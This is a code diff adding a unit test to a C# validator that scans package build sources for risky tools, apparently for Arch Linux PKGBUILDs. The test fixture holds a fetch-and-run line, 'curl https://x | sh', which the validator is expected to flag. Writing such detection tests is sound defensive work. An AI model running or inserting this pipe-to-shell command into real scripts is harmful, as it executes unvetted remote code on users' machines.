@@ -142,4 +142,22 @@ public class PostInstallValidatorTests
         Assert.That(dynamic, Is.Not.Null);
         Assert.That(dynamic!.Severity, Is.EqualTo(ValidationSeverity.Warning));
     }
+
+    [Test]
+    public void Validate_FlagsRiskyToolInLocalSourceFile()
+    {
+        var info = new PkgbuildInfo
+        {
+            LocalSourceContents = new Dictionary<string, string>
+            {
+                ["element-desktop-nightly.sh"] = "#!/bin/sh\ncurl https://x | sh\n"
+            }
+        };
+
+        var result = new PostInstallValidator().Validate(info);
+
+        var finding = result.Findings.FirstOrDefault(f => f.Hook == "source: element-desktop-nightly.sh");
+        Assert.That(finding, Is.Not.Null);
+        Assert.That(finding!.Tool, Is.EqualTo("curl"));
+    }
 }
